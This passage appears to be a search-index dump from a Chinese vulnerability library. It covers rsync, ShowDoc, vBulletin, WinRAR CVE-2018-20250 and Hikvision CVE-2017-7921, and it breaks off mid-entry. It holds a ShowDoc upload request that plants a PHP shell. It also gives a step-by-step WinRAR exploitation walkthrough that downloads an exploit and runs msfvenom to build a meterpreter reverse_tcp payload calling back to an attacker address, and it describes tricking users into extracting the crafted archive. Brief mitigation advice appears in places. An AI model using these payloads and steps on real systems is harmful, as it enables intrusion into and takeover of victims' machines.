./</code></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/rsyns/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u914d\u7f6e\u53ea\u8bfb\u914d\u7f6e\u8ba4\u8bc1\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","title":"Showdoc\u7684api page\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#showdocapi_page","title":"showdoc\u7684api_page\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3010\u9700\u8981\u767b\u5f55\u3011","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_1","title":"\u80cc\u666f","text":"<p>ShowDoc is a tool greatly applicable for an IT team to share documents online\u4e00\u4e2a\u975e\u5e38\u9002\u5408IT\u56e2\u961f\u7684\u5728\u7ebfAPI\u6587\u6863\u3001\u6280\u672f\u6587\u6863\u5de5\u5177</p> <p>\u5b98\u7f51 \uff1ahttps://www.showdoc.cc/ </p> <p>GitHub\u4e3b\u9875\uff1ahttps://github.com/star7th/showdoc</p> <p>\u5f53\u524d\u6d4b\u8bd5\u7248\u672c\uff1av2.6.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_2","title":"\u6f0f\u6d1e\u70b9","text":"<p>https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L258</p> <pre><code>//\u4e0a\u4f20\u9644\u4ef6\n    public function upload(){\n        $login_user = $this-&gt;checkLogin();\n        $item_id = I(\"item_id/d\") ? I(\"item_id/d\") : 0 ;\n        $page_id = I(\"page_id/d\") ? I(\"page_id/d\") : 0 ;\n        $uploadFile = $_FILES['file'] ;\n\n        if (!$page_id) {\n            $this-&gt;sendError(10103,\"\u8bf7\u81f3\u5c11\u5148\u4fdd\u5b58\u4e00\u6b21\u9875\u9762\u5185\u5bb9\");\n            return;\n        }\n        if (!$this-&gt;checkItemPermn($login_user['uid'] , $item_id)) {\n            $this-&gt;sendError(10103);\n            return;\n        }\n\n        if (!$uploadFile) {\n           return false;\n        }\n\n        if (strstr(strip_tags(strtolower($_FILES['editormd-image-file']['name'])), \".php\") ) {\n            return false;\n        }\n\n        $upload = new \\Think\\Upload();// \u5b9e\u4f8b\u5316\u4e0a\u4f20\u7c7b\n        $upload-&gt;maxSize  = 4145728000 ;// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5927\u5c0f\n        $upload-&gt;rootPath = './../Public/Uploads/';// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u76ee\u5f55\n        $upload-&gt;savePath = '';// \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5b50\u76ee\u5f55\n        $info = $upload-&gt;uploadOne($uploadFile) ;\n        if(!$info) {// \u4e0a\u4f20\u9519\u8bef\u63d0\u793a\u9519\u8bef\u4fe1\u606f\n          $this-&gt;error($upload-&gt;getError());\n          return;\n        }else{// \u4e0a\u4f20\u6210\u529f \u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u4fe1\u606f\n          $url = get_domain().__ROOT__.substr($upload-&gt;rootPath,1).$info['savepath'].$info['savename'] ;\n          $insert = array(\n            \"uid\" =&gt; $login_user['uid'],\n            \"item_id\" =&gt; $item_id,\n            \"page_id\" =&gt; $page_id,\n            \"display_name\" =&gt; $uploadFile['name'],\n            \"file_type\" =&gt; $uploadFile['type'],\n            \"file_size\" =&gt; $uploadFile['size'],\n            \"real_url\" =&gt; $url,\n            \"addtime\" =&gt; time(),\n            );\n          $ret = D(\"UploadFile\")-&gt;add($insert);\n\n          echo json_encode(array(\"url\"=&gt;$url,\"success\"=&gt;1));\n        }\n\n    }\n</code></pre> <p>\u76f8\u6bd4 https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php#L212 \u7684uploadImg() \u6709\u8fc7\u6ee4,\u9644\u4ef6\u4e0a\u4f20upload()\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4.\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20shell\u3002</p> <p>burp\u7684post\u6570\u636e\u5927\u81f4\u5982\u4e0b\uff1a</p> <pre><code>POST /show/server/index.php?s=/api/page/upload HTTP/1.1\n\n------WebKitFormBoundaryzOQywSoNbAALAwKn\nContent-Disposition: form-data; name=\"page_id\"\n\n22\n------WebKitFormBoundaryzOQywSoNbAALAwKn\nContent-Disposition: form-data; name=\"item_id\"\n\n3\n------WebKitFormBoundaryzOQywSoNbAALAwKn\nContent-Disposition: form-data; name=\"file\"; filename=\"cs.php\"\nContent-Type: image/png\n\n\u0089PNG\n\u001a\n------WebKitFormBoundaryzOQywSoNbAALAwKn--\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/showdoc/showdoc%E7%9A%84api_page%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_3","title":"\u9632\u5fa1","text":"<p>\u589e\u52a0\u8fc7\u6ee4\uff0c\u540c\u65f6\u8fd0\u7ef4\u4eba\u5458\u8bbe\u7f6e\u4e0a\u4f20\u76ee\u5f55\u7981\u6b62\u6267\u884c\uff0c\u53ea\u5141\u8bb8\u5199\u5165\u8bfb\u53d6\uff0c\u505a\u597d\u6743\u9650\u5206\u914d\u3002</p> <p>\u6765\u6e90\u4e8e\u571f\u53f8\uff1ahttps://www.t00ls.net/thread-56340-1-1.html \u7531Mrxn \u6574\u7406 \uff0c\u6b22\u8fce\u5927\u5bb6\u524d\u5f80\u571f\u53f8\u6295\u7a3f\u6ce8\u518c\u53d1\u8a00\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/","title":"vBulletin 5.x RCE\uff08CVE-2019-16759 \uff09","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:11:45</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#poc","title":"POC","text":"<p>\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1KRwmpFVvgV875i0eEaypYQ \u63d0\u53d6\u7801\uff1aklwy</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin%205.x%20RCE%EF%BC%88CVE-2019-16759%20%EF%BC%89/#_1","title":"\u4fee\u590d\u5efa\u8bae\uff1a","text":"<p>\u5347\u7ea7\u5230\u6700\u65b0\u7248</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"vBulletin5 5.6.1 SQL\u6ce8\u5165\u6f0f\u6d1e","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-20 16:06:02</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>5.5.6pl1\u4e4b\u524d\u7684vBulletin\uff0c5.6.0pl1\u4e4b\u524d\u76845.6.0\u548c5.6.1pl1\u4e4b\u524d\u76845.6.1\u5177\u6709\u9519\u8bef\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \u5b9e\u9645\u662fnodeId\u672a\u6388\u6743sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4e14\u5371\u5bb3\u8f83\u5927\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>vBulletin 5.5.6pl1\u4e4b\u524d\u7248\u672c vBulletin 5.6.0pl1\u4e4b\u524d\u76845.6.0\u7248\u672c vBulletin 5.6.1pl1\u4e4b\u524d\u76845.6.1\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#payload","title":"payload\uff1a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/vBulletin/vBulletin5%205.6.1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u5b89\u5168\u8865\u4e01\uff0c\u8bf7\u53ca\u65f6\u66f4\u65b0\u8865\u4e01</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/","title":"WinRAR\u7a7f\u900f\u6f0f\u6d1e\uff08CVE 2018 20250\uff09","text":"<p>WinRAR \u4ee3\u7801\u6267\u884c\u76f8\u5173\u7684CVE \u7f16\u53f7\u5982\u4e0b\uff1a</p> <p>CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</p> <p>\u8fd9\u91cc\u6211\u4eec\u590d\u73b0\u6700\u5f00\u59cb\u7684WinRAR\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff08CVE-2018-20250\uff09\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_2","title":"\u539f\u7406\uff1a","text":"<p>WinRAR\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff08CVE-2018-20250\uff09\uff1a</p> <p>\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eWinRAR \u6240\u4f7f\u7528\u7684\u4e00\u4e2a\u9648\u65e7\u7684\u52a8\u6001\u94fe\u63a5\u5e93UNACEV2.dll\u6240\u9020\u6210\u7684\uff0c\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u57282006  \u5e74\u88ab\u7f16\u8bd1\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u57fa\u7840\u4fdd\u62a4\u673a\u5236(ASLR,DEP \u7b49)\u3002\u8be5\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4f5c\u7528\u662f\u5904\u7406ACE  \u683c\u5f0f\u6587\u4ef6\u3002\u800c\u5728\u89e3\u538b\u5904\u7406\u8fc7\u7a0b\u4e2d\u5b58\u5728\u4e00\u5904\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e,\u5141\u8bb8\u89e3\u538b\u8fc7\u7a0b\u5199\u5165\u6587\u4ef6\u81f3\u5f00\u673a\u542f\u52a8\u9879\uff0c\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_3","title":"\u5f71\u54cd\u7248\u672c\uff1a","text":"<p>WinRAR &lt; 5.70 Beta 1</p> <p>Bandizip &lt; = 6.2.0.0</p> <p>\u597d\u538b(2345\u538b\u7f29) &lt; = 5.9.8.10907</p> <p>360\u538b\u7f29 &lt; = 4.0.0.1170</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_4","title":"\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\uff1a","text":"<p>\u653b\u51fb\u4e0d\u80fd\u8de8\u76d8\u7b26\uff0c\u5373\u53d7\u5bb3\u8005\u8fdb\u884c\u89e3\u538b\u6587\u4ef6\u89e6\u53d1\u6f0f\u6d1e\u65f6\uff0c\u5fc5\u987b\u5728\u7cfb\u7edf\u76d8\uff0c\u4e14\u5728\u4e0d\u77e5\u9053\u8ba1\u7b97\u673a\u4e3b\u673a\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u80fd\u5728\u4e3b\u6d4f\u89c8\u5668\u7684\u9ed8\u8ba4\u4e0b\u8f7d\u8def\u5f84\u4e0b\uff08C:\\Users\\Administrator\\Downloads\uff09\u6216\u8005\u684c\u9762\u8fdb\u884c\u89e3\u538b\uff0c\u6216\u8005\u591a\u731c\u51e0\u4e2a\u542f\u52a8\u9879\u8def\u5f84\u3002\u4ea7\u751f\u6f0f\u6d1e\u7684DLL\u6587\u4ef6\uff1aUNACEV2.DLL\uff0c\u4e0d\u80fd\u8bc6\u522b\u76f8\u5bf9\u8def\u5f84\uff0c\u6587\u4ef6\u540d\u90e8\u5206\u5fc5\u987b\u4e3a\u7edd\u5bf9\u8def\u5f84\u3002</p> <p>\u4ee5\u4e0b\u662f\u51e0\u79cd\u673a\u5668\u7684\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u4e2a\u4ebaPC\u4e0a\u53d7\u7528\u6237\u540d\u5f71\u54cd\uff0c\u65e0\u6cd5\u731c\u6d4b\u5230\u51c6\u786e\u7684\u8def\u5f84\uff0c\u800c\u670d\u52a1\u5668\u4e0a\u4e00\u822c\u4e0d\u4f1a\u4fee\u6539\u7528\u6237\u540d\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6f0f\u6d1e\u5728\u670d\u52a1\u5668\u4e0a\u5229\u7528\u5ea6\u6bd4\u8f83\u9ad8\u3002</p> <p>Win2003\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Documents and Settings\\Administrator\\\u300c\u5f00\u59cb\u300d\u83dc\u5355\\\u7a0b\u5e8f\\\u542f\u52a8</p> <p>Win2008\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</p> <p>Win2012\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</p> <p>Win7\u3000 \u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\\u7528\u6237\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</p> <p>Win10\u3000\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\\u7528\u6237\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u3000\u3000\u672c\u6b21\u8bd5\u9a8c\u4f7f\u7528\u7684\u662fWin2008\uff0c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_5","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_6","title":"\u73af\u5883\u5de5\u5177\uff1a","text":"<p>\u670d\u52a1\u5668\uff1aWin2008 R2</p> <p>WinRAR 5.60\u7b80\u4f53\u4e2d\u6587\u7248\uff1ahttps://www.rarlab.com/rar/winrar-x64-560sc.exe</p> <p>Python-3.7.2-amd64.exe\uff1ahttps://www.python.org/ftp/python/3.7.2/python-3.7.2-amd64.exe</p> <p>010Editor\uff1ahttps://download.sweetscape.com/010EditorWin64Installer901.exe</p> <p>Wace\u548c\u6a21\u677f\u6587\u4ef6\uff1ahttps://github.com/360-A-Team/CVE-2018-20250</p> <p>EXP\uff1ahttps://github.com/WyAtu/CVE-2018-20250</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_7","title":"\u6f0f\u6d1e\u590d\u73b0\uff1a","text":"<p>\u8fd9\u91cc\u6211\u4eec\u5199\u4e00\u4e2abat\uff0c\u8fdb\u884c\u5f39\u7a97\u6f14\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u6253\u5f00WinAce\uff0c\u9009\u4e2d\u6211\u4eec\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u53f3\u952e\uff0c\u70b9\u51fbAdd to...</p> <p></p> <p>\u5229\u7528WinACE\u8fdb\u884c\u538b\u7f29,\u8fd9\u91cc\u9009\u62e9store full path\u3002</p> <p></p> <p>\u751f\u6210\u4e4b\u540e\u6211\u4eec\u5229\u7528\u811a\u672c\u68c0\u67e5\u4e00\u4e0b\u6211\u4eec\u751f\u6210\u7684\u6587\u4ef61.ace\u7684header\u4fe1\u606f\uff1a</p> <p></p> <p>\u8fd9\u91cc\u51e0\u4e2a\u662f\u6211\u4eec\u9700\u8981\u4fee\u6539\u7684\u53c2\u6570\u3002</p> <p>\u5728010Edit\u5de5\u5177\u4e2d\u6253\u5f00\u521a\u624d\u751f\u6210\u76841.ace\u6587\u4ef6\uff0c\u5c06\u6587\u4ef6\u8def\u5f84\u66ff\u6362\u4e3a\u542f\u52a8\u9879\u8def\u5f84\u5982\u4e0b\uff0c\u7136\u540e\u53ef\u4ee5\u770b\u5230\u65b0\u7684\u5b8c\u6574\u7684\u6587\u4ef6\u8def\u5f84\u957f\u5ea6\u4e3a93\uff0c\u8f6c\u6362\u4e3a16\u8fdb\u5236\u540e\u4e3a\uff1a5D\u3002</p> <p></p> <p>\u4fee\u6539\u5b8c\u8fd9\u4e24\u4e2a\u5730\u65b9\u4e4b\u540e\u70b9\u51fb\u4fdd\u5b58\uff0c\u63a5\u7740\u8fd8\u9700\u8981\u4fee\u6539hdr_size\u3002</p> <p></p> <p></p> <p>\u8fd9\u4e09\u4e2a\u5730\u65b9\u4fee\u6539\u5b8c\u6210\u4e4b\u540e\u70b9\u51fb\u4fdd\u5b58\u3002</p> <p>\u6700\u540e\u5229\u7528acefile.py\u91cd\u65b0\u67e5\u770b\u6587\u4ef6header\u4fe1\u606f\u3002\u4fee\u6539acefile.py\uff0c\u57283061\u884c\u5904\u6dfb\u52a0\u4ee5\u4e0b\u8bed\u53e5\uff0c\u8f93\u51fa\u6587\u4ef6hdr_crc\u3002</p> <p></p> <pre><code>print(\"[+] right_hdr_crc : {} | struct {} \".format(hex(ace_crc16(buf)),struct.pack('&lt;H', ace_crc16(buf))))\nprint(\"[*] current_hdr_crc : {} | struct {}\".format(hex(hcrc),struct.pack('&lt;H', hcrc)))\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u7684hdr_crc\u4e3a\uff1a16 9A\uff0c\u6211\u4eec\u8981\u628a\u5b83\u6539\u4e3aE4 A3\uff0c\u4fdd\u5b58\u4e4b\u540e\u91cd\u65b0\u67e5\u770b\u6587\u4ef6header\u4fe1\u606f\u3002</p> <p></p> <p>\u4fee\u6539\u5b8c\u6210\uff0c\u5c06\u6587\u4ef6\u53e6\u5b58\u4e3a1.rar\u3002</p> <p></p> <p>\u9009\u62e9\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\u6216\u89e3\u538b\u5230\u6587\u4ef6\u59391\u90fd\u53ef\u4ee5\uff0c\u53ef\u4ee5\u770b\u5230bat\u6587\u4ef6\u6210\u529f\u89e3\u538b\u5230\u5f00\u673a\u542f\u52a8\u9879\u91cc\u3002</p> <p></p> <p>\u91cd\u542f\u7535\u8111\u67e5\u770b\u6548\u679c\u3002</p> <p></p> <p>\u590d\u73b0\u6210\u529f\uff0c\u81ea\u52a8\u8fd0\u884cbat\u6587\u4ef6\u5f39\u7a97\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#msf","title":"MSF\u5229\u7528","text":"<p>\u9996\u5148\u4e0b\u8f7dEXP\uff1a</p> <pre><code>wget https://github.com/WyAtu/CVE-2018-20250/archive/master.zip\n</code></pre> <p>\u8fd9\u91cc\u6211\u89e3\u538b/root/tools\u76ee\u5f55\u4e0b\uff1a</p> <p></p> <p>\u7136\u540e\u5229\u7528msf\u751f\u6210\u4e00\u4e2a\u6076\u610f\u7a0b\u5e8f\uff0c\u653e\u5230\u8be5\u76ee\u5f55\u4e0b\uff1a</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.86.129 lport=4444 -f exe -o /root/tools/CVE-2018-20250-master/test.exe\n</code></pre> <p>\u4fee\u6539exp.py\u6587\u4ef6\uff1a</p> <p></p> <p>\u5c06evil_filename\u6539\u4e3a\u6211\u4eec\u751f\u6210\u7684\u6076\u610f\u7a0b\u5e8f\u3002</p> <p></p> <p>\u5c06py -3 \u6539\u4e3apython3\uff0c\u4fee\u6539\u5b8c\u6210\u4e4b\u540e\u4fdd\u5b58\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a</p> <pre><code>python3 exp.py \n</code></pre> <p></p> <p>\u6210\u529f\u751f\u6210\u653b\u51fb\u6587\u4ef6test.rar\uff0c\u53ea\u8981\u8bf1\u5bfc\u7528\u6237\u4e0b\u8f7d\u89e3\u538b\u8fd9\u4e2a\u538b\u7f29\u6587\u4ef6\u5462\uff0c\u5c31\u53ef\u5f97\u5230\u7528\u6237\u7535\u8111\u6743\u9650\uff0c\u8fd9\u91cc\u53ea\u6f14\u793a\u529f\u80fd\uff0c\u6211\u4eec\u7528python\u7b80\u5355\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1\uff1a</p> <pre><code>python -m SimpleHTTPServer\n</code></pre> <p>\u5207\u6362\u5230win2008\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u8981\u653b\u51fb\u7684\u76ee\u6807\u673a\u5668\u3002\u4e0b\u8f7dtest.rar\uff0c\u7136\u540e\u76f4\u63a5\u5728\u4e0b\u8f7d\u76ee\u5f55\u89e3\u538b\uff08\u4e5f\u53ef\u9009\u62e9\u5728\u684c\u9762\u89e3\u538b\uff09\u3002</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5728\u7cfb\u7edf\u7684\u542f\u52a8\u8def\u5f84\u4e0b\u6210\u529f\u89e3\u538b\u51fahi.exe\u6587\u4ef6\u3002\u63a5\u7740\u6211\u4eec\u5728kali\u4e0a\u9762\u5f00\u542f\u76d1\u542c\uff0c\u7136\u540e\u91cd\u542fwin2008\u3002</p> <p></p> <p>\u6210\u529f\u62ff\u5230\u76ee\u6807\u673a\u5668\u6743\u9650\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_8","title":"\u6f0f\u6d1e\u9632\u5fa1","text":"<p>\u5220\u9664\u53d7\u5f71\u54cd\u538b\u7f29\u8f6f\u4ef6\u76ee\u5f55\u4e0bUNACEV2.dll\u6587\u4ef6\u80fd\u6709\u6548\u9632\u5fa1\u3002 \u3000\u3000\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\uff0cWinRAR \u76ee\u524d\u7248\u672c\u662f 5.70 Beta 1\u3002 \u3000\u3000\u603b\u800c\u8a00\u4e4b\uff0c\u8be5\u6f0f\u6d1e\u5e76\u6ca1\u6709\u90a3\u4e48\u81f4\u547d\u3002\u76ee\u6807\u6027\u7684\u6253\u7ad9\uff0c\u5f97\u5148\u6b3a\u9a97\u4e0b\u8f7d\uff0c\u5e76\u518d\u5728\u672a\u9632\u62a4\u7684\u670d\u52a1\u5668\u4e0a\u89e3\u538b\uff0c\u4f01\u4e1a\u670d\u52a1\u5668\u7ba1\u7406\u5458\u90fd\u5f88\u96be\u4f1a\u8fd9\u6837\u505a\u3002\u800c\u4e14\u5fc5\u987b\u5f97\u670d\u52a1\u5668\u91cd\u542f\u624d\u80fd\u751f\u6548\uff0c\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\u811a\u672c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/Hikvision%28CVE-2017-7921%29/","title":"Hikvision(CVE 2017 7921)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/Hikvision%28CVE-2017-7921%29/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u5728\u6d77\u5eb7\u5a01\u89c6DS-2CD2xx2F-I Series V5.2.0 build 140721\u81f3V5.4.0 build 160530\u3001DS-2CD2xx0F-I Series V5.2.0 build 140721\u81f3V5.4.0 build 160401\u3001DS-2CD2xx2FWD Series V5.3.1 build 150410\u81f3V5.4.4 build 161125\u3001DS-2CD4x2xFWD Series V5.2.0 build 140721\u81f3V5.4.0 build 160414\u4e2d\u53d1\u73b0\u4e0d\u6b63\u786e\u7684\u8eab\u4efd\u9a8c\u8bc1\u95ee\u9898\uff0cDS-2CD4xx5 Series V5.2.0 build 140721 to V5.4.0 build 160421\u3001DS-2DFx Series V5.2.0 build 140805 to V5.4.5 build 160928\u548cDS-2CD63xx Series V5.0.9 build 140305 to V5.3.5 build 